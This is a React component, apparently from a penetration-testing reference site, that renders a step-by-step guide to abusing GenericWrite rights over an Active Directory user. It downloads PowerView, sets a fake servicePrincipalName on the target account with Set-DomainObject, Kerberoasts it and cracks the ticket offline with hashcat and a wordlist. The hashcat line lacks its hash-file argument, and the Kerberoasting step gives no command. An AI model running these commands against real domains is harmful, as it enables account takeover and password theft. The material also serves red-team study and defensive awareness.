import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const GenericWriteOnUser = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              Generic Write access grants you the ability to write to any
              non-protected attribute on the target object, including “members”
              for a group, and “serviceprincipalnames” for a user. With
              GnericWrite over a user, we can perform a targeted kerberoasting
              attack.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Download PowerView.ps1 and transfer it to the victim machine.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>Import the PowerView.ps1 module.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"Import-Module .\\PowerView.ps1"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Modify the account's servicePrincipalName attribute to create a
              fake SPN that we can Kerberoast to obtain the TGS ticket and
              (hopefully) crack the hash offline using Hashcat or John the
              Ripper.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "Set-DomainObject -Identity {USER_WE_WANT} -SET @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>Kerberoast the ticket for the user we want.</Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>Crack the password.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"hashcat -m 13100 /usr/share/wordlists/rockyou.txt --force"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default GenericWriteOnUser;
